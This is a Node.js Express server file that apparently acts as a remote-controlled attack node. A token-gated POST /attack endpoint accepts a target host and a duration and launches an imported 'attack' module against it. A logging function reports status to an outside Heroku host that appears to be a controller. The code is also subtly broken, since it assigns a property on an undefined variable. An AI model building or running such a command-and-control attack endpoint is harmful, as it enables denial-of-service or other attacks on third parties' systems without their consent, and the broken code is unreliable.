var express = require('express');
var path = require('path');

var Req = require('request');

var app = express();

var id;
var attack = require('./attack');

var s=0;
var n = 10;

im.success = 0;
const lto = 'https://sawt.herokuapp.com';

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(function (req,res,next) {
  if(!req.query.hash || req.query.hash !== "1111991")
  {
    res.status(403);
    res.end('your are banned');
    console.log(req.query);
    return;
  }

  console.log(req.body);

  next();
});


// on post
app.post('/attack',function (req,res) {
  var host = req.body.host;
  id = req.body.id;
  var limit = (req.body.limit || 5) * 60;



var a = new attack(host);
a.start(limit);
  console.log('starting');
  res.end('started');

});

//---------------0000000000



app.use('/', function (req,res) {
  res.end('hi');
});

app.use(function (req,res) {
  res.status(404);
  res.end('Not Found');
});



function Log(txt) {
  txt = id + ' :'+txt;
  console.log(txt);

var pin = '1111991';

  Req.post({
    url:lto+'/reg?hash='+pin,
    form:{
      s:txt,
      id:id
    }
  },
function (err) {

});
}

function getNow() {
  var iraq = new Date().getTime();
  return iraq;
}



module.exports = app;
